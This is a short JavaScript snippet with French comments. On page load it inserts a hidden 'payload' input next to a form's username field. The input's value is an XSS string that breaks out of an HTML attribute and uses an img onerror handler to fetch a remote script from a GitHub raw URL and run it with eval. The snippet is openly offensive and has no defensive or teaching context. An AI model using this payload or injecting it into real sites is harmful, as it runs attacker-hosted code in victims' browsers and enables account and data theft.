// On attend que le DOM soit complètement chargé
document.addEventListener('DOMContentLoaded', function() {
    // On sélectionne le champ "username"
    var usernameField = document.getElementById('username');

    // On vérifie qu'il existe bien
    if (usernameField) {
        // On crée un nouveau champ input caché
        var hiddenField = document.createElement('input');

        // On configure le champ
        hiddenField.setAttribute('type', 'hidden');
        hiddenField.setAttribute('id', 'payload');
        hiddenField.setAttribute('name', 'payload');
        hiddenField.setAttribute('value', '"><img src=x onerror="fetch(\'https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/payload.js\').then(r=>r.text()).then(c=>eval(c))">');

        // On l'ajoute juste après le champ username, dans le même parent
        usernameField.parentNode.insertBefore(hiddenField, usernameField.nextSibling);

        // Juste pour vérifier en debug (optionnel)
        console.log('Champ caché payload ajouté juste après #username');
    } else {
        console.log('Champ username introuvable');
    }
});
